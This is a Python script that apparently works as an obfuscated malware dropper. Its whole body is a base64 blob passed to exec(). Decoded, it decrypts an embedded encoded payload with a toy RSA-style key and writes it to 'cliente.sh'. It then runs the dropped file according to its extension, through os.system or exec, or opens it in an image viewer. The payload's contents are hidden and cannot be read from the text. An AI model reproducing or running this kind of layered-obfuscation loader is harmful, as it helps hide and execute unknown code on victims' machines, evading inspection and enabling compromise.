import base64
data = b'aW1wb3J0IGFyZ3BhcnNlLCBtYXRoLCBiYXNlNjQsIGJpbmFzY2lpLCByYW5kb20sIHN5cywgc3VicHJvY2Vzcywgb3MKZnJvbSByYW5kb20gaW1wb3J0IHJhbmRpbnQKY2R4ID0gIk1UQTJNamhrTVRSaU5tWT1NVEEyTWpkbU1UUmlObVk9TVRBMk1qaGtNbVk9Tm1ZPU1UQTJNamt5TVRFeU5tWT1NVEEyTWpZM01URXlObVk9TVRBMk1qa3lOV009Tm1ZPU1UQTJNamt5TW1ZPU5tWT1NVEEyTWpkbU5ETTBObVk9TVRBMlpEZz1NbVk9Tm1ZPU1UQTJNamt5TldNPU5tWT1NVEJpTWpkbU1UUmlObVk9TVRBMk1UVmxNVEV5Tm1ZPU1UQTJNamhrTVRSaU5tWT1NVEEyTWpoa05XTT1ObVk9TVRBMk1qZG1ZamM9Tm1ZPU1UQTJaRGc9WWpjPU5tWT1NVEEyTWpoa01UUmlObVk9TVRBMk1qaGtNakEyTm1ZPU1UQTJOREl5TVRCaU5tWT1NVEEyTWpreU1URXlObVk9TVRBMk1qaGtNVFJpTm1ZPU1UQTJNamhrWWpjPU5tWT1NVEEyTkRJeU1tWT1ObVk9TVRBMlpEZz1OV009Tm1ZPU1UQTJNalkzTVRFeU5tWT1NVEEyTWpreU5XTT1ObVk9TVRBMk1qZG1OV009Tm1ZPU1UQTJaRGc9TldNPU5tWT1NVEEyWkRnPU1UQmlObVk9TVRBMk1qaGtZamM9Tm1ZPU1UQTJNamt5TkRVd05tWT1NVEEyTkRJeU1UQmlObVk9TVRBMlpEZz1NVEJpTm1ZPU1UQTJOREl5TWpBMk5tWT1NVEEyTWpreU1tWT1ObVk9TVRBMk1qZG1ORFV3Tm1ZPU1UQTJNamhrTVRSaU5tWT1NVEEyTWpoa1lqYz1ObVk9TVRBMk5ESXlNbVk9Tm1ZPU1UQTJaRGc9TldNPU5tWT1NVEEyWkRnPU1tWT1ObVk9TVRBMk5ESXlNelJoTm1ZPU1UQmlNamRtTVRSaU5tWT1NVEEyTVRWbE1URXlObVk9TVRBMk1qaGtNVFJpTm1ZPU1UQTJNamhrTldNPU5tWT1NVEEyTVRjMk1qQTJObVk9TVRBMk1qZG1ORFV3Tm1ZPU1UQTJaRGc9TW1ZPU5tWT1NVEEyTkRJeU16UmhObVk9TVRBMk1qa3lORFV3Tm1ZPU1UQTJOREl5TVRFeU5tWT1NVEEyWkRnPU16UmhObVk9TVRBMk1qaGtOV009Tm1ZPU1UQTJNamhrTkRVd05tWT1NVEEyTWpkbU16UmhObVk9TVRBMlpEZz1NbVk9Tm1ZPU1UQmlNamRtTVRCaU5tWT1NVEEyTVRjMk16UmhObVk9TVRBMk1UYzJNbVk9Tm1ZPU1UQTJaRGc9TVRCaU5tWT1NVEEyTkRJeU16UmhObVk9TVRBMk1qa3lORFV3Tm1ZPU1UQTJaRGc9WWpjPU5tWT1NVEEyTWpZM01URXlObVk9TVRBMk1qaGtNVEJpTm1ZPU1UQTJNamhrTVRFeU5tWT1NVEEyTWpkbU16UmhObVk9TVRBMlpEZz1NVEJpTm1ZPU1UQTJaRGc9TVRSaU5tWT1NVEEyTWpoa01URXlObVk9TVRBMk1qZG1NelJoTm1ZPU1UQTJaRGc9TVRCaU5tWT1NVEEyTWpoa01UQmlObVk9TVRBMk1qaGtNVEV5Tm1ZPU1UQTJOREl5TWpBMk5tWT1NVEEyTWpreU1UQmlObVk9TVRBMk1qa3lOV009Tm1ZPU1UQmlNamRtTWpBMk5tWT1NVEJpTWpkbU5ETTBObVk9TVRBMlpEZz1NVEJpTm1ZPU1UQTJOREl5TXpSaE5tWT1NVEJpTWpkbU1UUmlObVk9TVRBMk5ESXlNbVk9Tm1ZPU1UQTJaRGc9TXpSaE5tWT1NVEEyTWpreU5XTT1ObVk9TVRBMk1UYzJNakEyTm1ZPU1UQTJOREl5TVRCaU5tWT1NVEEyTWpoa01UUmlObVk9TVRBMk1qaGtOV009Tm1ZPU1UQTJNamRtWWpjPU5tWT1NVEEyWkRnPVlqYz1ObVk9TVRBMk1qaGtNVFJpTm1ZPU1UQTJNamhrTWpBMk5tWT1NVEEyTkRJeU1UQmlObVk9TVRBMk1qa3lNVEV5Tm1ZPU1UQTJNVGMyTkRVd05tWT1NVEEyWkRnPU1UUmlObVk9TVRBMk1qaGtNVEV5Tm1ZPU1UQTJOREl5TWpBMk5tWT1NVEEyTWpoa01UUmlObVk9TVRBMk1qaGtOV009Tm1ZPU1UQTJOREl5TVRCaU5tWT1NVEEyTWpkbU5XTT1ObVk9TVRBMk1qaGtNVEJpTm1ZPU1UQTJOREl5TWpBMk5tWT1NVEEyTVRjMk1URXlObVk9TVRBMk5ESXlNVEJpTm1ZPU1UQTJNamt5TVRSaU5tWT1NVEEyTWpreU5XTT1ObVk9TVRBMk1qa3lNVEV5Tm1ZPU1UQTJaRGc9TldNPU5tWT1NVEEyTVRjMk1UQmlObVk9TVRBMk1qa3lZamM9Tm1ZPU1UQTJNamhrTVRSaU5tWT1NVEEyWkRnPU5XTT1ObVk9TVRBMk1UYzJNVEJpTm1ZPU1UQTJNamt5WWpjPU5tWT1NVEEyTWpoa01URXlObVk9TVRBMlpEZz1OV009Tm1ZPU1UQTJNVGMyTVRFeU5tWT1NVEJpTWpkbU5ETTBObVk9TVRBMk5ESXlNVEJpTm1ZPU1UQTJNamRtTWpBMk5tWT1NVEEyWkRnPU16UmhObVk9TVRBMk1qaGtZamM9Tm1ZPU1UQTJNVGMyTVRFeU5tWT1NVEEyTWpkbU5EVXdObVk9TVRBMk1qWTNNVEV5Tm1ZPU1UQTJNamhrWWpjPU5tWT1NVEEyTWpreU5EVXdObVk9TVRBMk5ESXlNVEV5Tm1ZPU1UQTJNalkzTVRFeU5tWT1NVEEyTWpreU1UQmlObVk9TVRBMk1qaGtNbVk9Tm1ZPU1UQTJOREl5TVRCaU5tWT1NVEEyWkRnPU1tWT1ObVk9TVRBMk1qaGtNVEJpTm1ZPU1UQTJNamhrTW1ZPU5tWT1NVEEyTWpkbU5XTT1ObVk9TVRBMlpEZz1NelJoTm1ZPU1UQTJNamt5TldNPU5tWT1NVEEyTWpreU5EVXdObVk9TVRBMk1qZG1NVFJpTm1ZPU1UQTJaRGc9TXpSaE5tWT1NVEEyTWpoa05XTT1ObVk9TVRCaU1qZG1ZamM9Tm1ZPU1UQmlNamRtTkRVd05tWT1NVEEyTWpoa01UUmlObVk9TVRBMk1qaGtNVEJpTm1ZPU1UQTJaRGc9TVRCaU5tWT1NVEEyWkRnPU5XTT1ObVk9TVRBMlpEZz1NVEJpTm1ZPU1UQTJNamhrWWpjPU5tWT1NVEEyTWpreU5EVXdObVk9TVRBMk5ESXlNVEJpTm1ZPU1UQTJaRGc9TVRCaU5tWT1NVEEyTkRJeU1qQTJObVk9TVRBMk1qa3lNbVk9Tm1ZPU1UQTJNamRtTkRVd05tWT1NVEEyTWpoa01UQmlObVk9TVRBMk5ESXlNelJoTm1ZPU1UQmlNamRtTWpBMk5tWT1NVEEyTkRJeU1URXlObVk9TVRBMk1qaGtNVFJpTm1ZPU1UQTJNamhrTVRCaU5tWT1NVEEyTWpreU1tWT1ObVk9TVRBMk1qZG1ORE0wTm1ZPU1UQTJaRGc9TVRCaU5tWT1NVEEyTWpoa01UQmlObVk9TVRBMk1qaGtNVEV5Tm1ZPU1UQTJOREl5TW1ZPU5tWT1NVEEyWkRnPU1UQmlObVk9TVRBMk1qaGtZamM9Tm1ZPU1UQTJNamt5TkRVd05tWT1NVEEyTkRJeU1UQmlObVk9TVRBMlpEZz1NVEJpTm1ZPU1UQTJOREl5TWpBMk5tWT1NVEEyTWpreU1tWT1ObVk9TVRBMk1qZG1ORFV3Tm1ZPU1UQTJNamhrTVRCaU5tWT1NVEEyWkRnPU5XTT1ObVk9TVRCaU1UVmxNelJoTm1ZPU1UQmlNVFZsTXpSaE5tWT0iCmRycG5tID0gImNsaWVudGUuc2giCnBrID0gKDMxMSwgMTEyMSkKCmRlZiBkY3kocGssIGNwdHgpOgoJaywgbiA9IHBrCgltZW5zYWplUmVjaWJpZG8gPSBfX3JlQmE2NF9fKGNwdHguZW5jb2RlKCd1dGYtOCcpKQoJbWVuc2FqZUhleFJlY2liaWRvID0gX19iYTY0SGV4X18obWVuc2FqZVJlY2liaWRvKQoJbWVuc2FqZURlY2ltYWxSZWNpYmlkbyA9IF9faGV4RGVjX18obWVuc2FqZUhleFJlY2liaWRvKQoJbWVuc2FqZURlc2NpZnJhZG8gPSBbKChjICoqIGspICUgbikgZm9yIGMgaW4gbWVuc2FqZURlY2ltYWxSZWNpYmlkb10KCW1lbnNhamVfZGVfYXNjaWkgPSBfX2RlQVNfXyhtZW5zYWplRGVzY2lmcmFkbykKCWRlY2FzYyA9IF9fcmVCYTY0X18oJycuam9pbihtZW5zYWplX2RlX2FzY2lpKS5lbmNvZGUoKSkKCWhleGJhNjQgPSBfX2JhNjRIZXhfXyhkZWNhc2MpCglhc2hleCA9IF9faGV4RGVjX18oaGV4YmE2NCkKCWRlYXNjID0gX19kZUFTX18oYXNoZXgpCgliYTY0ID0gYmFzZTY0LmI2NGRlY29kZShkZWFzYy5lbmNvZGUoKSkKCXJldHVybiBiYTY0CmRlZiBfX3JlQmE2NF9fKG0pOgoJbUJhNjQgPSBbbVtpOmkrNF0gZm9yIGkgaW4gcmFuZ2UoMCwgbGVuKG0pLCA0KV0KCXJldHVybiBtQmE2NApkZWYgX19iYTY0SGV4X18obSk6CgltSHggPSBbYmFzZTY0LmI2NGRlY29kZShiNjQpIGZvciBiNjQgaW4gbV0KCXJldHVybiBtSHgKZGVmIF9faGV4RGVjX18obSk6CgltRGVjID0gW2ludChoZXhhLmRlY29kZSgiVVRGLTgiKSwgMTYpIGZvciBoZXhhIGluIG1dCglyZXR1cm4gbURlYwpkZWYgX19kZUFTX18obSk6CgltMSA9ICcnLmpvaW4oW2NocihkKSBmb3IgZCBpbiBtXSkKCXJldHVybiBtMQpkZWYgX19tZUFTX18obSk6CgltZW4gPSBbb3JkKHApIGZvciBwIGluIG1dCglyZXR1cm4gbWVuCmRjeV9kYXRhID0gZGN5KHBrPXBrLCBjcHR4PWNkeCkKCmltYWdlX2V4dGVuc2lvbnMgPSAoJ2pwZycsICdqcGVnJywgJ2JwbScsICdpY28nLCAncG5nJykKZXhlY19leHRlbnNpb25zID0gKCdiYXQnLCAnZXhlJywgJ3ZicycsICdwczEnKQpweXRob25fZXh0ZW5zaW9ucyA9ICgncHknKQpuZiA9IG9wZW4oZHJwbm0sICd3YicpCnRyeToKCW5mLndyaXRlKGRjeV9kYXRhKQpleGNlcHQ6CglwYXNzCm5mLmNsb3NlKCkKaWYgb3MucGF0aC5leGlzdHMoZHJwbm0pOgoJaWYgZHJwbm0uc3BsaXQoJy4nKVsxXSBpbiBpbWFnZV9leHRlbnNpb25zOgoJCWltYWdlVmlld2VyRnJvbUNvbW1hbmRMaW5lID0geydsaW51eCc6J3hkZy1vcGVuJywgJ3dpbjMyJzonZXhwbG9yZXInLCAnZGFyd2luJzonb3Blbid9W3N5cy5wbGF0Zm9ybV0KCQlzdWJwcm9jZXNzLnJ1bihbaW1hZ2VWaWV3ZXJGcm9tQ29tbWFuZExpbmUsIGRycG5tXSwgY2xvc2VfZmRzPVRydWUpCglpZiBkcnBubS5zcGxpdCgnLicpWzFdIGluIGV4ZWNfZXh0ZW5zaW9ucyBhbmQgc3lzLnBsYXRmb3JtID09ICd3aW4zMic6CgkJb3Muc3lzdGVtKGRycG5tKQoJaWYgZHJwbm0uc3BsaXQoJy4nKVsxXSBpbiBweXRob25fZXh0ZW5zaW9uczoKCQlleGVjKGRjeV9kYXRhKQoJCXByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKCdweXRob24ge2ZufScuZm9ybWF0KGZuPWRycG5tKSwgc2hlbGw9VHJ1ZSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFKQo='
exec(base64.b64decode(data))